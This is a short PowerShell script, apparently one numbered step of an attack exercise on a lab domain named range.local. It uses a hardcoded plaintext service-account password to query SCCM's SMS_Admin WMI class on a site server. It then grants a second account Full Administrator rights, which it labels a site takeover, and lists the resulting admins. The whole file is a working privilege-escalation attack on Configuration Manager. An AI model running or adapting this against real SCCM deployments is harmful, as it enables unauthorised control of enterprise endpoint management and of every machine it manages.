# T039 SCCM site takeover: grant controlled account SCCM admin via SMS_Admin
$ErrorActionPreference = "Continue"
$user = "range.local\svc_sccm"
$pass = "s3rv1c3_SCCM!"
$cred = New-Object System.Management.Automation.PSCredential($user, (ConvertTo-SecureString $pass -AsPlainText -Force))
$ns = "root\SMS\site_CAD"

Write-Output "=== current svc_sccm roles ==="
try {
  $adm = Get-WmiObject -ComputerName "mbr02.range.local" -Namespace $ns -Class "SMS_Admin" -Credential $cred -Filter "LogonName='RANGE\\svc_sccm'" -ErrorAction Stop
  $adm | ForEach-Object { Write-Output "svc_sccm roles: $($_.RoleName -join ', ')" }
} catch { Write-Output "query err: $($_.Exception.Message)" }

Write-Output "=== grant RANGE\\svc_naa Full Administrator (site takeover) ==="
try {
  $new = Set-WmiInstance -ComputerName "mbr02.range.local" -Namespace $ns -Class "SMS_Admin" -Credential $cred -Arguments @{
    LogonName = "RANGE\\svc_naa"
    RoleName = @("Full Administrator")
  } -ErrorAction Stop
  Write-Output "ADDED: $($new.LogonName) roles=$($new.RoleName -join ',')"
} catch { Write-Output "add err: $($_.Exception.Message)" }

Write-Output "=== re-query admins ==="
try {
  $admins = Get-WmiObject -ComputerName "mbr02.range.local" -Namespace $ns -Class "SMS_Admin" -Credential $cred -ErrorAction Stop
  $admins | ForEach-Object { Write-Output "ADMIN: $($_.LogonName) [$($_.RoleName -join ',')]" }
} catch { Write-Output "re-query err: $($_.Exception.Message)" }
Write-Output "=== T039_DONE ==="
